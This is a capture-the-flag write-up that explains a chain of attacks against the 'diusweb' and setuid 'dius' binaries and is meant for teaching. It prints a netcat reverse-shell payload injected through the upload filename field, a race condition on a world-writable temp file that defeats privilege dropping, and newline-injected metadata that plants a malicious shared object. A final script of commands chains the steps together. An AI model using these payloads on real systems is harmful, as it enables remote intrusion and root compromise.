# Who Does This Belong To

This was a binary exploitation problem that involved a long (and eventually quite satisfying) exploit chain.

## Understanding the Challenge Files

The challenge files provide us with two main binaries: `diusweb` and `dius`. Additionally, we are provided with a few other files used in this challenge:

* `diusweb.cfg`: This is the main configuration file consumed by the `diusweb` and `dius` binaries. It has options for specifying what port the server should listen on (`PORT`), which directory on the system is considered the web root (`WEB_DIRECTORY`), whether privileges should be dropped (`DROP_PRIVS`), and a couple of other unimportant options. This configuration file also has a note letting us know that the flag is in `/root/flag`.
* `www/`: A copy of the web directory from the target. Of note here is that the `www/dius` directory is meant to contain files that users upload to the website, and the `www/c` directory contains shared objects that implement different compression algorithms that can be lazily loaded for use by the `dius` binary.

### `diusweb`

I didn't spend a ton of time reversing or understanding the `diusweb` binary, as it is only a small part of this challenge. This binary powers the web interface that was the only initially exposed part of this challenge, and serves as our initial access vector.

The fundamental flaw in the `diusweb` binary is that, in order to compress user-uploaded files, it uses lib's `system` to call the `dius` binary . However, it uses the unchanged user-specified filename when building the `dius` command-line that gets passed to `system`, so command injection is trivial. One of the provided hints let us know that `nc` is installed on the target, so we can pop a reverse shell like:

```sh
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.254.20 5555 >/tmp/f;
```

### `dius`

With unprivileged access on the target system, and knowing that the flag is in `/root/flag`, we need to escalate privileges into `root`. A quick search for setuid binaries on the target system indicates that `dius` is indeed setuid on the target system, and seems like the obvious target for exploitation.

#### Basic Functionality

`dius` is a command-line tool that supports the compression and decompression of files. It has three basic modes of operations:

* `c`: Create a new archive.
* `x`: Extract the contents of an archive.
* `t`: List the contents of an archive.

#### Compression Shared Objects

`dius` also allows for hot-swapping of compression algorithms by loading compression/decompression implementations from shared objects stored in the `/challenge/www/c` directory. These shared objects are loaded following the naming scheme `/challenge/www/c/libX.so`, where `X` can be replaced with any letter. No validation is performed on what letter is specified, so this becomes an enticing target for achieving code execution. We can control the shared object that gets loaded using commands of the form:

```sh
dius cw some_file.txt b:some_file.txt
```

The `b:` portion of this command will tell `dius` to load the library `/challenge/www/c/libb.so`. If we could just write a shared object named `libb.so` to the `/challenge/www/c` directory, then we know we can execute it. We can see how this works in Ghidra's decompilation of the `get_compression_function` function:

```c
void * get_compression_function(settings *settings,char compression,int compress)
{
... snip ...
  if (compression_functions[(long)(int)(uint)(compress != 0) + (long)(int)local_1034 * 2] ==
      (void *)0x0) {
    snprintf(library,0x1000,"%s/www/c/lib%c.so",settings->web_directory,(ulong)(uint)(int)local_1034
            );
    lVar2 = dlopen(library,1);
    if (lVar2 == 0) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    if (compress == 0) {
      pcVar3 = "decompress_buffer";
    }
    else {
      pcVar3 = "compress_buffer";
    }
    pvVar4 = (void *)dlsym(lVar2,pcVar3,lVar2);
... snip ...
}
```

There are also three existing libraries that come with `dius`: `libn.so`, `libx.so`, and `libz.so`. The only one of these that we will use in some way is `libn.so`, as it performs no compression and preserves the contents of the input file we specify (just with a bit of metadata appended to its end). This will become useful as we attempt to overwrite privileged files on the target.

#### Metadata Interpreter

The `dius` binary has an interesting way of processing what we specify on the command-line into the actions it eventually performs. Instead of directly executing code related to different functionality, `dius` will instead do the following:

* Create a temporary file in the directory `/tmp/dius`. This file name is securely generated with [`mkstemp`](http://man7.org/linux/man-pages/man3/mkstemp.3.html) and not feasibly predictable. However, this file's permissions are set to be world readable and writable.
* Translate the mode of operation (`c`, `x`, or `l`) and user-specified options into a series of text-based opcodes and values, which get written to the temporary file.
* Interpret the contents of the temporary file via the `interpret_metadata_file` function.

#### Dropping Privileges

The final crucial detail for exploitation is `dius`'s behavior for dropping privileges. Because we need to become `root`, we cannot let `dius` drop its privileges when we attempt to execute our shared library. In its normal operation, `dius` *should* end up dropping its privileges over all execution paths. However, the checks related to its privilege-dropping-decision-logic are vulnerable to race conditions and unexpected changes to the underlying metadata temporary file.

The only metadata directives we need to care about for exploitation are:

* `CREATE`: This is a binary option that indicates whether this is archive-creation execution. The presence of `CREATE` is the first one checked and takes precedence over all other top-level operations.
* `WEB`: When `CREATE` has been specified, `WEB` indicates that the archive to be created should end up in the web uploads directory (`/challenge/www/dius/`).
* `FILENAME`: The name of the output archive to be created when creating an archive.
* `FILENAMEn`: The path to the nth input file when creating an archive.
* `FILESIZEn`: The size of the nth input file when creating an archive.

## Exploiting `dius`

In this section, we'll take a look at Ghidra's decompilation of some of the vulnerable code paths and put together a full exploit chain.

### Preventing Privilege Dropping

When interpreting the metadata file, there are two points when privileges can be dropped:

* At the very beginning of execution, if either of the metadata keys `CREATE:` or `WEB:` are not in the metadata file.
* In the web-file-creation path, if privileges were not dropped in the previous check. However, this only occurs *after* the file descriptor to the output file has been opened. If we could `open` a privileged file before privileges are dropped in this scenario, then the program could still write to that file descrtiptor even after dropping privileges.

Knowing all of this, our goal becomes more clear: somehow, we need to avoid the first potential privilege drop, but still specify a non-web file path for writing. This would allow us to overwrite the `/etc/diusweb.cfg` configuration file with a disabled `DROP_PRIVILEGES` value.

The first step in achieving this is recognizing the vulnerable implementation of the `get_metadata_key` function. This function is called each time one of the metadata keys' values needs to be check (such as the value corresponding to the `FILENAME:` key). Looking at Ghidra's decompilation:

```c
char * get_metadata_key(char *filename,char *name)
{
  long lVar1;
  int __fd;
  ssize_t sVar2;
  char *pcVar3;
  long in_FS_OFFSET;
  int fd;
  char metadata_buffer [8192];

  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  __fd = open(filename,0);
  if (__fd < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar2 = read(__fd,metadata_buffer,0x2000);
  if (sVar2 < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  close(__fd);
  pcVar3 = get_string(metadata_buffer,name,"\n");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return pcVar3;
}
```

We can see that every time this function is called, it re-opens the temporary metadata file and scans it for the specified key. Due to the constant opening and closing of this file, and the fact that its permissions are set to world writable, we can change its contents in between different metadata checks during the execution of `interpret_metadata_file`.

This is the main tool we'll use to write to a privileged file of our choice. Let's next dive into the privilege dropping logic within `interpret_metadata_file`:

```c
void interpret_metadata_file(settings *settings,char *mf)
{
... snip ...
  amount_written = 0;
  memset(file_infos,0,0x74);
  filename_00 = get_metadata_key(mf,"CREATE:");
  if ((filename_00 == (char *)0x0) ||
     (filename_00 = get_metadata_key(mf,"WEB:"), filename_00 == (char *)0x0)) {
    if (settings->drop_privs != 0) {
      drop_privs("nobody");
    }
    bVar2 = true;
  }
  filename_00 = get_metadata_key(mf,"CREATE:");
  if (filename_00 == (char *)0x0) {
    filename_00 = get_metadata_key(mf,"FILENAME:");
    fd = read_file(filename_00);
    ... snip ...
  }
  else {
    filename_00 = get_metadata_key(mf,"FILENAME:");
    __nptr = get_metadata_key(mf,"WEB:");
    if (__nptr == (char *)0x0) {
      strcpy(output_filename,filename_00);
    }
    else {
      snprintf(output_filename,0x1000,"%s/www/dius/%s",settings->web_directory,filename_00);
      fd = is_in_web_directory(settings,output_filename);
      if (fd == 0) {
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
    }
    unlink(output_filename);
    fd = open(output_filename,0x41,0x1a4);
    if (fd < 0) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    free(filename_00);
    if ((!bVar2) && (settings->drop_privs != 0)) {
      drop_privs("nobody");
    }
... snip ...
}
```

We can see that the first potential for dropping privileges at the beginning of this code snippet, which will be executed if either of the `CREATE:` and `WEB:` keys is missing from the metadata file. So, we need both of these keys to be present in the temporary metadata file at the time of this first check. However, think about what would happen in the second privilege-drop check if somehow the `WEB:` key "disappeared" from the metadata file in between the two checks: the value associated with the `FILENAME:` key would be taken as the absolute output file path, and `open`ed before the program has dropped its privileges.

To attack this race condition, we want to update the contents of the currently-interpreted metadata file to remove the `WEB:` key in between these two checks. To do this quickly, I used [`inotify`](http://man7.org/linux/man-pages/man7/inotify.7.html) to watch the `/tmp/dius` directory for file creation events, and updated the created temporary metadata file's contents to a fake configuration file that omits the `WEB:` key, sets the output `FILENAME:` location to `/etc/diusweb.cfg`, and sets the input file to a [modified configuration file](./fake.cfg). You can find my implementation in the [`drop-privs.c`](./drop-privs.c) file.

### Gaining Code Execution

Exploiting the metadata file race condition turns out to be the hard part; injecting our own shared object into the `/challenge/www/c` directory is fairly straightforward with the right primitive.

Because the `FILENAME:` metadata value is populated directly from one of the user-specified command-line arguments, we can actually write arbitrary contents to the metadata file via a newline injection. We can see this in the below Ghidra decompilation of the `list_archive_contents` function.

```c
int list_archive_contents(settings *settings,int argc,char **argv)
{
... snip ...
  __fd = get_metadata_file(filename);
  write(__fd,"LIST:1\n",7);
  // Newline injection to write arbitrary directives to metadata file in the
  // line below.
  snprintf(buffer,0x80,"FILENAME:%s\n",argv[2]);
  sVar2 = strlen(buffer);
  write_loop(__fd,buffer,(int)sVar2);
  pcVar3 = strchr(argv[1],0x73);
  if (pcVar3 != (char *)0x0) {
    write(__fd,"SIZES:1\n",8);
  }
  pcVar3 = strchr(argv[1],0x75);
  if (pcVar3 != (char *)0x0) {
    write(__fd,"UNHIDE:1\n",9);
  }
  close(__fd);
  interpret_metadata_file(settings,filename);
  unlink(filename);
... snip ...
}
```

Observe that the raw value of `argv[2]` is eventually written into the file. Because the `CREATE:` metadata key takes precedence over all other top-level operations, we can use a command like the following:

```sh
dius t $'../c/libb.so\nCREATE:1\nWEB:1\nFILENAME0:libb.so\nCOMPRESS0:n\nFILESIZE0:8112\n'
```

Which corrupts the metadata file contents into something like:

```
LIST:1
FILENAME:../c/libb.so
CREATE:1
WEB:1
FILENAME0:libb.so
COMPRESS0:n
FILESIZE0:8112
```

Since we control the `FILENAME:` key, we are writing our input file to `/challenge/www/dius/../c/libb.so`. Using the `n` compression (which simply appends a bit of data to the end of our input file), we can write a [shared object with a flag-reading constructor](./read-flag.c). Once privileges have been prevented from dropping, this shared object is capable of reading `/root/flag`.

## Final Exploitation Walkthrough

Due to the number of steps involved in the full exploit chain, I ended up writing out a lot of pasteables before my final successful attempt at getting the flag. Here is what I was working with:

```sh
# On local, build files we'll need on target and set up the netcat transfer
# on this end.
./build.sh
tar -czvf files.tar.gz drop-privs libb.so fake.metadata fake.cfg
ncat -lvnp 4321 < files.tar.gz

# On local, set up listeners for reverse shells.
ncat -lvnp 6666
ncat -lvnp 5555

# On diusweb web interface, pop two reverse shells via command injection in
# the filename field.
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.254.20 6666 >/tmp/f;
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.254.20 5555 >/tmp/f;

# On remote, transfer our exploitation files.
cd /tmp
nc 10.0.254.20 4321 > files.tar.gz
tar xvzf files.tar.gz

# On remote, we now kick off the two parts of our privilege-dropping race. In
# our first shell, we
# start our drop-privs binary in an infinite loop until we've successfully
# overwritten /etc/diusweb.cfg.
cd /tmp
until grep -a 'DROP_PRIVS 0' /etc/diusweb.cfg; do ./drop-privs; done

# On remote, in our second shell, we repeatedly execute the dius binary so that
# our drop-privs tool can attempt to overwrite the metadata file that gets
# generated each time dius is invoked. I needed to add the sleep to the loop
# due to the resource-constrained nature of the Docker container the target was
# running in. Running too many rapid processes bogged the target down to the
# point where the race condition would never work.
cd /tmp
bash -c "for i in {1..100}; do sleep 1 && dius x $'dummy\nCREATE:1\nWEB:1\nFILENAME0:fake.cfg\nCOMPRESS0:n\nFILESIZE0:98\n'; done"

# On remote, write our flag-reading shared object to the /challenge/www/c/
# directory.
bash -c "dius t $'../c/libb.so\nCREATE:1\nWEB:1\nFILENAME0:libb.so\nCOMPRESS0:n\nFILESIZE0:8112\n'"
ls -al /challenge/www/c

# On remote, trigger execution of our injected shared object.
echo AAAA > test.txt
dius cw libb.so b:test.txt

# Read the flag that our shared object dropped as world readable for us in /tmp.
cat /tmp/flag
```
